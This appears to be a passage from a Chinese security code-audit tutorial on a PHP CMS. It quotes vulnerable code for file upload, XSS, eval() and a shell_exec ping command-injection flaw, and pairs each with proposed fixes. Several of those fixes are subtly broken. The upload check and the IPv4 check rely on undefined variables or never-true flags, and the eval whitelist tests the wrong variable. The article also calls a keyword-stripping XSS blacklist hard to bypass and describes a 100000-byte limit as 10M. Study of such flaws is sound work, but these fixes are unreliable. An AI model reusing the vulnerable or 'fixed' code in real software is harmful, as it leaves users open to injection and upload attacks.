      <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
   	  <span class="hljs-variable">$file_name</span> = str_ireplace(<span class="hljs-variable">$deny_ext</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file_name</span>);
      <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];

      <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$path</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;

      <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传成功！&#x27;</span>;
       &#125; <span class="hljs-keyword">else</span> &#123;
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
       &#125;
        
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-variable">$msg</span> = <span class="hljs-variable">$path</span> . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$msg</span>;
    &#125;
    &#125;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch(<span class="hljs-string">&#x27;/photo&#x27;</span>,[<span class="hljs-string">&#x27;msg&#x27;</span>=&gt;<span class="hljs-variable">$msg</span>,<span class="hljs-string">&#x27;path&#x27;</span>=&gt;<span class="hljs-variable">$img_path</span>]);
&#125;</code></pre>

<p>可以看到上面是使用黑名单，对含有黑名单后缀的文件进行替换，显示这样是很不安全的，使用双写即可绕过，造成了文件上传漏洞</p>
<h4 id="漏洞防御-9"><a href="#漏洞防御-9" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><pre><code class="hljs php">  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">photo</span>(<span class="hljs-params"></span>)</span>&#123;
      <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;&#x27;</span>;
      <span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;./uploads/images/photo&quot;</span>;
      define(<span class="hljs-string">&quot;UPLOAD_PATH&quot;</span>,<span class="hljs-string">&quot;../public/uploads/images/photo&quot;</span>);
      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;
      <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        <span class="hljs-variable">$uploaded_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
  <span class="hljs-variable">$uploaded_size</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;upload_file&#x27;</span> ][ <span class="hljs-string">&#x27;size&#x27;</span> ];
  <span class="hljs-variable">$uploaded_type</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;upload_file&#x27;</span> ][ <span class="hljs-string">&#x27;type&#x27;</span> ];
        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];

          <span class="hljs-comment">//文件上传漏洞修复 </span>
        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$path</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$uploaded_name</span>;
  <span class="hljs-keyword">if</span>( ( strtolower( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&#x27;jpg&#x27;</span> || strtolower( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&#x27;gif&#x27;</span> || strtolower( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&#x27;png&#x27;</span> ) &amp;&amp;
( <span class="hljs-variable">$uploaded_size</span> &lt; <span class="hljs-number">100000</span> ) &amp;&amp; getimagesize( <span class="hljs-variable">$uploaded_tmp</span> ) &amp;&amp; 
( <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&#x27;image/jpeg&#x27;</span> || <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&#x27;image/png&#x27;</span>|| <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&#x27;image/gif&#x27;</span> ) 
            ) &#123;
            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
                  <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传成功！&#x27;</span>;
        	   &#125; <span class="hljs-keyword">else</span> &#123;
                  <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
         	   &#125;
        &#125;<span class="hljs-keyword">else</span>&#123;
            <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;文件类型不正确&quot;</span>)
  &#125;         
      &#125; <span class="hljs-keyword">else</span> &#123;
          <span class="hljs-variable">$msg</span> = <span class="hljs-variable">$path</span> . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
          <span class="hljs-keyword">echo</span> <span class="hljs-variable">$msg</span>;
      &#125;
      &#125;
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch(<span class="hljs-string">&#x27;/photo&#x27;</span>,[<span class="hljs-string">&#x27;msg&#x27;</span>=&gt;<span class="hljs-variable">$msg</span>,<span class="hljs-string">&#x27;path&#x27;</span>=&gt;<span class="hljs-variable">$img_path</span>]);
  &#125;

</code></pre>

<p>其中if中的条件如下</p>
<ul>
<li><p><code>( strtolower( $uploaded_ext ) == &#39;jpg&#39; || strtolower( $uploaded_ext ) == &#39;gif&#39; || strtolower( $uploaded_ext ) == &#39;png&#39; )</code></p>
<p>保证文件后缀名只能是<code>jpg gif png</code>的一个</p>
</li>
<li><p><code>( $uploaded_type == &#39;image/jpeg&#39; || $uploaded_type == &#39;image/png&#39;|| $uploaded_type == &#39;image/gif&#39; )</code></p>
<p>文件的MIME必须为三者中的一个</p>
</li>
<li><p><code>( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp )</code></p>
<p>这是保证文件的大小小10M，并且文件不能空</p>
</li>
</ul>
<h3 id="漏洞点二-6"><a href="#漏洞点二-6" class="headerlink" title="漏洞点二"></a>漏洞点二</h3><h4 id="代码分析-9"><a href="#代码分析-9" class="headerlink" title="代码分析"></a>代码分析</h4><p>改代码位于<code>application\attachment\controller\Upload.php</code>中的saveFile方法</p>
<pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$size_limit</span> &gt; <span class="hljs-number">0</span> &amp;&amp; (<span class="hljs-variable">$file</span>-&gt;getInfo(<span class="hljs-string">&#x27;size&#x27;</span>) &gt; <span class="hljs-variable">$size_limit</span>)) &#123;
    <span class="hljs-keyword">return</span> json([
        <span class="hljs-string">&#x27;status&#x27;</span>  =&gt; <span class="hljs-number">0</span>,
        <span class="hljs-string">&#x27;info&#x27;</span>    =&gt; <span class="hljs-string">&#x27;附件过大&#x27;</span>,
        <span class="hljs-string">&#x27;state&#x27;</span>   =&gt; <span class="hljs-string">&#x27;附件过大&#x27;</span>, <span class="hljs-comment">//兼容百度</span>
        <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;附件过大&#x27;</span>, <span class="hljs-comment">//兼容editormd</span>
    ]);
&#125;
<span class="hljs-comment">// 判断附件格式是否符合</span>
<span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$file</span>-&gt;getInfo(<span class="hljs-string">&#x27;name&#x27;</span>);

<span class="hljs-variable">$error_msg</span> = <span class="hljs-string">&#x27;&#x27;</span>;

<span class="hljs-keyword">if</span> (<span class="hljs-variable">$error_msg</span> != <span class="hljs-string">&#x27;&#x27;</span>) &#123;
    <span class="hljs-keyword">return</span> json([
        <span class="hljs-string">&#x27;code&#x27;</span>    =&gt; <span class="hljs-number">-1</span>,
        <span class="hljs-string">&#x27;info&#x27;</span>    =&gt; <span class="hljs-variable">$error_msg</span>,
        <span class="hljs-string">&#x27;state&#x27;</span>   =&gt; <span class="hljs-variable">$error_msg</span>, <span class="hljs-comment">//兼容百度</span>
        <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-variable">$error_msg</span>, <span class="hljs-comment">//兼容editormd</span>
    ]);
&#125;</code></pre>

<p>可以看到这段代码中只是对上传附件的大小进行了检查，而没有对文件的后缀和文件的MIME进行检查，这样攻击者就可以任意的上传文件，造成文件上传漏洞，危害还是很大的。</p>
<h4 id="漏洞防御-10"><a href="#漏洞防御-10" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><p><strong>方法一</strong></p>
<p>对于其的防御方法就是获取文件的类型然后检查其是否符合要求。这里只允许上传<code>png,jpg,jpeg,gif,bmp</code>类型的文件</p>
<pre><code class="hljs php">      <span class="hljs-variable">$file_ext</span>  = strtolower(substr(<span class="hljs-variable">$file_name</span>, strrpos(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>) + <span class="hljs-number">1</span>));<span class="hljs-comment">//获取文件的后缀名</span>

<span class="hljs-comment">// 获取文件的MiME,注意这里不是从客户端的请求头中获取的，而是根据文件的后缀名从php函数中获取，这样就可以防止攻击者修改MIME进行欺骗</span>
      <span class="hljs-keyword">try</span> &#123;
          <span class="hljs-variable">$fileMine</span> = <span class="hljs-variable">$file</span>-&gt;getMime();
      &#125; <span class="hljs-keyword">catch</span> (\<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$ex</span>) &#123;
          <span class="hljs-variable">$error_msg</span> = <span class="hljs-variable">$ex</span>-&gt;getMessage();
      &#125;
<span class="hljs-comment">// 禁止MIME为text/x-php或text/html</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-variable">$fileMine</span> == <span class="hljs-string">&#x27;text/x-php&#x27;</span> || <span class="hljs-variable">$fileMine</span> == <span class="hljs-string">&#x27;text/html&#x27;</span>) &#123;
          <span class="hljs-variable">$error_msg</span> = <span class="hljs-string">&#x27;禁止上传非法文件！&#x27;</span>;
      &#125;
<span class="hljs-comment">//禁止后缀名为php的</span>
      <span class="hljs-keyword">if</span> (preg_grep(<span class="hljs-string">&quot;/php/i&quot;</span>, <span class="hljs-variable">$ext_limit</span>)) &#123;
          <span class="hljs-variable">$error_msg</span> = <span class="hljs-string">&#x27;禁止上传非法文件！&#x27;</span>;
      &#125;
<span class="hljs-comment">// 禁止上传文件名后缀名在$ext_limit中的</span>
      <span class="hljs-keyword">if</span> (!preg_grep(<span class="hljs-string">&quot;/<span class="hljs-subst">$file_ext</span>/i&quot;</span>, <span class="hljs-variable">$ext_limit</span>)) &#123;
          <span class="hljs-variable">$error_msg</span> = <span class="hljs-string">&#x27;附件类型不正确！&#x27;</span>;
      &#125;
      <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$ext_limit</span>)) &#123;
          <span class="hljs-variable">$error_msg</span> = <span class="hljs-string">&#x27;附件类型不正确！&#x27;</span>;
      &#125;
<span class="hljs-comment">// 禁止上传php,html后缀的文件</span>
      <span class="hljs-keyword">if</span>(<span class="hljs-variable">$file_ext</span> == <span class="hljs-string">&quot;php&quot;</span> || <span class="hljs-variable">$file_ext</span> == <span class="hljs-string">&quot;html&quot;</span>) &#123;
          <span class="hljs-variable">$error_msg</span> = <span class="hljs-string">&#x27;禁止上传非法文件！&#x27;</span>;
      &#125;</code></pre>



<p><strong>方法二</strong></p>
<p>对保存文件的目录修改权限。</p>
<p>已经知道，用户上传的文件会被保存到的<code>public/uploads/images</code>目录下，首先查看一下该文件的权限信息</p>
<pre><code class="hljs avrasm">ls -<span class="hljs-keyword">ld</span> images/</code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210405202954282.png" alt="image-20210405202954282"></p>
<p>可以看到这是777权限，很明显这个权限设置是不合理的，那么我们将其改为744权限</p>
<pre><code class="hljs apache"><span class="hljs-attribute">chmod</span> -R <span class="hljs-number">744</span> images/</code></pre>

<p>再来查看之前上传上的木马文件就会发现文件不存在，这样就会避免了一句话木马的危害</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210405203502846.png" alt="image-20210405203502846"></p>
<h2 id="8-XSS"><a href="#8-XSS" class="headerlink" title="8.XSS"></a>8.XSS</h2><h3 id="漏洞点一-7"><a href="#漏洞点一-7" class="headerlink" title="漏洞点一"></a><strong>漏洞点一</strong></h3><h4 id="代码分析-10"><a href="#代码分析-10" class="headerlink" title="代码分析"></a>代码分析</h4><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;request-&gt;isPost()) &#123;
          <span class="hljs-variable">$data</span> = <span class="hljs-keyword">$this</span>-&gt;request-&gt;post(<span class="hljs-string">&#x27;info/a&#x27;</span>);
          <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;send_from&#x27;</span>] = <span class="hljs-keyword">$this</span>-&gt;_userinfo[<span class="hljs-string">&#x27;username&#x27;</span>];
          <span class="hljs-keyword">if</span> (!MemberModel::getByUsername(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;send_to&#x27;</span>])) &#123;
              <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;用户不存在&#x27;</span>);
          &#125;
          <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;modelClass-&gt;allowField(<span class="hljs-literal">true</span>)-&gt;save(<span class="hljs-variable">$data</span>)) &#123;
              <span class="hljs-keyword">$this</span>-&gt;success(<span class="hljs-string">&#x27;发送成功！&#x27;</span>);
          &#125; <span class="hljs-keyword">else</span> &#123;
              <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;发送失败！&#x27;</span>);
          &#125;</code></pre>

<p>可以看到这里对用户发送的消息，只是检查了接收消息者是否存在，而没有对用户发送的内容进行检查和过滤，给了攻击者可乘之机，这里就需要对用户输入的内容进行过滤。</p>
<h4 id="漏洞防御-11"><a href="#漏洞防御-11" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><p><strong>方法一</strong></p>
<p>使用php自带的函数<code>htmlspecialchars</code>，将一些特殊字符转义，使其无法工作</p>
<pre><code class="hljs php">首先要知道data的结构
<span class="hljs-comment">/*</span>
<span class="hljs-comment">data的数据结构</span>
<span class="hljs-comment">array(4) &#123;</span>
<span class="hljs-comment">  [&quot;subject&quot;]=&gt;</span>
<span class="hljs-comment">  string(3) &quot;sad&quot;</span>
<span class="hljs-comment">  [&quot;send_to&quot;]=&gt;</span>
<span class="hljs-comment">  string(5) &quot;sunzy&quot;</span>
<span class="hljs-comment">  [&quot;content&quot;]=&gt;</span>
<span class="hljs-comment">  string(2) &quot;ad&quot;</span>
<span class="hljs-comment">  [&quot;send_from&quot;]=&gt;</span>
<span class="hljs-comment">  string(5) &quot;admin&quot;</span>
<span class="hljs-comment">&#125;</span>
<span class="hljs-comment">*/</span>

        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;request-&gt;isPost()) &#123;
            <span class="hljs-variable">$data</span> = <span class="hljs-keyword">$this</span>-&gt;request-&gt;post(<span class="hljs-string">&#x27;info/a&#x27;</span>);
            <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;send_from&#x27;</span>] = <span class="hljs-keyword">$this</span>-&gt;_userinfo[<span class="hljs-string">&#x27;username&#x27;</span>];
	    <span class="hljs-comment">// 短消息XSS防御</span>
	    	<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;subject&#x27;</span>] = htmlspecialchars(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;subject&#x27;</span>]);
	    	<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;content&#x27;</span>] = htmlspecialchars(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);
            <span class="hljs-keyword">if</span> (!MemberModel::getByUsername(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;send_to&#x27;</span>])) &#123;
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;用户不存在&#x27;</span>);
            &#125;
            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;modelClass-&gt;allowField(<span class="hljs-literal">true</span>)-&gt;save(<span class="hljs-variable">$data</span>)) &#123;
                <span class="hljs-keyword">$this</span>-&gt;success(<span class="hljs-string">&#x27;发送成功！&#x27;</span>);
            &#125; <span class="hljs-keyword">else</span> &#123;
                <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;发送失败！&#x27;</span>);
            &#125;

        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch();
        &#125;</code></pre>

<p>此时再发送带有恶意脚本的消息时，该脚本就不会被浏览器执行，而是当作普通的字符串</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420154610033.png" alt="image-20210420154610033"></p>
<p><strong>方法二</strong></p>
<p>这里就用一个很安全的过滤函数，这个函数很难被绕过。</p>
<pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">SafeFilter</span> (<span class="hljs-params">&amp;<span class="hljs-variable">$arr</span></span>) </span>
<span class="hljs-function"></span>&#123;
   <span class="hljs-variable">$ra</span>=<span class="hljs-keyword">Array</span>(<span class="hljs-string">&#x27;/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/&#x27;</span>,<span class="hljs-string">&#x27;/script/&#x27;</span>,<span class="hljs-string">&#x27;/javascript/&#x27;</span>,<span class="hljs-string">&#x27;/vbscript/&#x27;</span>,<span class="hljs-string">&#x27;/expression/&#x27;</span>,<span class="hljs-string">&#x27;/applet/&#x27;</span>,<span class="hljs-string">&#x27;/meta/&#x27;</span>,<span class="hljs-string">&#x27;/xml/&#x27;</span>,<span class="hljs-string">&#x27;/blink/&#x27;</span>,<span class="hljs-string">&#x27;/link/&#x27;</span>,<span class="hljs-string">&#x27;/style/&#x27;</span>,<span class="hljs-string">&#x27;/embed/&#x27;</span>,<span class="hljs-string">&#x27;/object/&#x27;</span>,<span class="hljs-string">&#x27;/frame/&#x27;</span>,<span class="hljs-string">&#x27;/layer/&#x27;</span>,<span class="hljs-string">&#x27;/title/&#x27;</span>,<span class="hljs-string">&#x27;/bgsound/&#x27;</span>,<span class="hljs-string">&#x27;/base/&#x27;</span>,<span class="hljs-string">&#x27;/onload/&#x27;</span>,<span class="hljs-string">&#x27;/onunload/&#x27;</span>,<span class="hljs-string">&#x27;/onchange/&#x27;</span>,<span class="hljs-string">&#x27;/onsubmit/&#x27;</span>,<span class="hljs-string">&#x27;/onreset/&#x27;</span>,<span class="hljs-string">&#x27;/onselect/&#x27;</span>,<span class="hljs-string">&#x27;/onblur/&#x27;</span>,<span class="hljs-string">&#x27;/onfocus/&#x27;</span>,<span class="hljs-string">&#x27;/onabort/&#x27;</span>,<span class="hljs-string">&#x27;/onkeydown/&#x27;</span>,<span class="hljs-string">&#x27;/onkeypress/&#x27;</span>,<span class="hljs-string">&#x27;/onkeyup/&#x27;</span>,<span class="hljs-string">&#x27;/onclick/&#x27;</span>,<span class="hljs-string">&#x27;/ondblclick/&#x27;</span>,<span class="hljs-string">&#x27;/onmousedown/&#x27;</span>,<span class="hljs-string">&#x27;/onmousemove/&#x27;</span>,<span class="hljs-string">&#x27;/onmouseout/&#x27;</span>,<span class="hljs-string">&#x27;/onmouseover/&#x27;</span>,<span class="hljs-string">&#x27;/onmouseup/&#x27;</span>,<span class="hljs-string">&#x27;/onunload/&#x27;</span>);
     
   <span class="hljs-keyword">if</span> (is_array(<span class="hljs-variable">$arr</span>))
   &#123;
     <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$arr</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) <span class="hljs-comment">//循环语句，挨个检测</span>
     &#123;
        <span class="hljs-keyword">if</span> (!is_array(<span class="hljs-variable">$value</span>))
        &#123;
          <span class="hljs-keyword">if</span> (!get_magic_quotes_gpc()) 
          &#123;
             <span class="hljs-variable">$value</span>  = addslashes(<span class="hljs-variable">$value</span>); <span class="hljs-comment">//给单引号（&#x27;）、双引号（&quot;）、反斜线（\）与 NUL（NULL 字符）  加上反斜线转义</span>
          &#125;
          <span class="hljs-variable">$value</span>       = preg_replace(<span class="hljs-variable">$ra</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$value</span>);     <span class="hljs-comment">//删除非打印字符</span>
          <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$key</span>]     = htmlentities(strip_tags(<span class="hljs-variable">$value</span>)); <span class="hljs-comment">//去除 HTML 和 PHP 标记并转换为 HTML 实体</span>
        &#125;
        <span class="hljs-keyword">else</span>
        &#123;
          SafeFilter(<span class="hljs-variable">$arr</span>[<span class="hljs-variable">$key</span>]);
        &#125;
     &#125;
   &#125;
&#125;</code></pre>



<h3 id="漏洞点二-7"><a href="#漏洞点二-7" class="headerlink" title="漏洞点二"></a><strong>漏洞点二</strong></h3><h4 id="代码分析-11"><a href="#代码分析-11" class="headerlink" title="代码分析"></a>代码分析</h4><p>代码位置<code>application\member\controller\Index.php</code>中的comment方法</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210419224100169.png" alt="image-20210419224100169"></p>
<p>很容易看到，没有对提交的数据进行处理，并且将提交的数据在页面使用echo打印出来，导致了XSS漏洞</p>
<h4 id="漏洞防御-12"><a href="#漏洞防御-12" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><p>使用php自带的函数<code>htmlspecialchars</code>，将一些特殊字符转义，使其无法工作，或者使用上面的过滤函数</p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">comment</span>(<span class="hljs-params"></span>)</span>&#123;

    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;request-&gt;isPost())&#123;
        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>];
        <span class="hljs-variable">$data</span> = htmlspecialchars(<span class="hljs-variable">$data</span>);
        <span class="hljs-variable">$userId</span> = <span class="hljs-keyword">$this</span>-&gt;userid;</code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420161125127.png" alt="image-20210420161125127" style="zoom:50%;">

<h2 id="9-RCE"><a href="#9-RCE" class="headerlink" title="9.RCE"></a>9.RCE</h2><h3 id="漏洞点一-8"><a href="#漏洞点一-8" class="headerlink" title="漏洞点一"></a><strong>漏洞点一</strong></h3><h4 id="代码分析-12"><a href="#代码分析-12" class="headerlink" title="代码分析"></a>代码分析</h4><p><code>application\admin\phpinfo\index</code></p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;request-&gt;isPost())&#123;
	   	<span class="hljs-variable">$data</span> = <span class="hljs-keyword">$this</span>-&gt;request-&gt;post(<span class="hljs-string">&#x27;data&#x27;</span>);

	   	<span class="hljs-keyword">echo</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$data</span>.<span class="hljs-string">&#x27;;&#x27;</span>);
	   &#125;
	   <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch();
&#125;</code></pre>

<p><code>eval()</code>函数将传进来的字符串当作php代码执行，导致了命令执行</p>
<h4 id="漏洞防御-13"><a href="#漏洞防御-13" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><p>既然功能就是查看phpinfo，那就设置一个白名单，检查提交的值是否为phpinfo</p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">   </span>&#123;
       <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;request-&gt;isPost())&#123;
   	   	<span class="hljs-variable">$data</span> = <span class="hljs-keyword">$this</span>-&gt;request-&gt;post(<span class="hljs-string">&#x27;data&#x27;</span>);
		<span class="hljs-variable">$whitelist</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;phpinfo&#x27;</span>);
       	<span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$whitelist</span>)) &#123;
           	<span class="hljs-keyword">return</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$data</span>.<span class="hljs-string">&#x27;;&#x27;</span>);
       	&#125; <span class="hljs-keyword">else</span> &#123;
           	<span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;Hacker!&quot;</span>);
       	&#125;
   	&#125;
   	   <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch();
   &#125;</code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420161650236.png" alt="image-20210420161650236"></p>
<p><strong>漏洞点二</strong></p>
<h4 id="代码分析-13"><a href="#代码分析-13" class="headerlink" title="代码分析"></a>代码分析</h4><pre><code class="hljs php">     <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;request-&gt;isPost()) &#123;
         <span class="hljs-variable">$ip</span> = <span class="hljs-keyword">$this</span>-&gt;request-&gt;post(<span class="hljs-string">&#x27;data&#x27;</span>);
         <span class="hljs-variable">$ip</span> = trim(<span class="hljs-variable">$ip</span>);
<span class="hljs-variable">$result</span> = <span class="hljs-string">&quot;&quot;</span>;
         <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$ip</span>) &amp;&amp; <span class="hljs-variable">$ip</span> !== <span class="hljs-string">&#x27;&#x27;</span>)
         &#123;
             <span class="hljs-variable">$result</span> = shell_exec(<span class="hljs-string">&#x27;ping &#x27;</span>.<span class="hljs-variable">$ip</span>);
             <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">$result</span>&lt;/pre&gt;&quot;</span>;
         &#125;
     &#125;</code></pre>

<p>可以看到，这里没有对用户提交的ip地址进行任何检查判断，导致攻击者可以使用管道符恶意的拼接命令，从而导致了命令注入，获取到服务的敏感资源。</p>
<h3 id="漏洞点二-8"><a href="#漏洞点二-8" class="headerlink" title="漏洞点二"></a>漏洞点二</h3><h4 id="漏洞防御-14"><a href="#漏洞防御-14" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><p><strong>方法一</strong></p>
<p>对用户提交的ip的地址进行判断，只有当符合IPv4的地址格式时，才允许执行下一步操作。</p>
<p>具体代码如下</p>
<pre><code class="hljs php">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;request-&gt;isPost()) &#123;
    <span class="hljs-variable">$ip</span> = <span class="hljs-keyword">$this</span>-&gt;request-&gt;post(<span class="hljs-string">&#x27;data&#x27;</span>);
    <span class="hljs-variable">$ip</span> = trim(<span class="hljs-variable">$ip</span>);
    <span class="hljs-variable">$is_ip</span> = <span class="hljs-literal">false</span>;
    <span class="hljs-variable">$result</span> = <span class="hljs-string">&#x27;&#x27;</span>;
    <span class="hljs-variable">$data</span> = explode(<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-variable">$ip</span>); <span class="hljs-comment">// 利用ipv4地址的特性检查</span>
    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>&lt;count(<span class="hljs-variable">$data</span>); <span class="hljs-variable">$i</span>++)&#123;
        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span>[<span class="hljs-variable">$i</span>] &gt; <span class="hljs-number">255</span> )
        &#123;
            <span class="hljs-variable">$is_ip</span> = <span class="hljs-literal">false</span>;
        &#125;
    &#125;
    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$is_ip</span>)&#123;
        <span class="hljs-variable">$result</span> = <span class="hljs-string">&quot;请输入正确的IPv4地址！&quot;</span>;
    &#125;
    <span class="hljs-keyword">else</span>&#123;
        <span class="hljs-variable">$result</span> = shell_exec(<span class="hljs-string">&#x27;ping -c 4&#x27;</span>.<span class="hljs-variable">$ip</span>);
    &#125;
    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">$result</span>&lt;/pre&gt;&quot;</span>;
&#125;</code></pre>



<p><strong>方法二</strong></p>
<p>使用php内置的函数对提交的参数进行过滤和转义，使得攻击者输入的一些特殊字符失去原来的作用。</p>
<p><code>escapeshellcmd</code>和<code>escapeshellarg</code>函数</p>
<pre><code class="hljs php">     <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;request-&gt;isPost()) &#123;
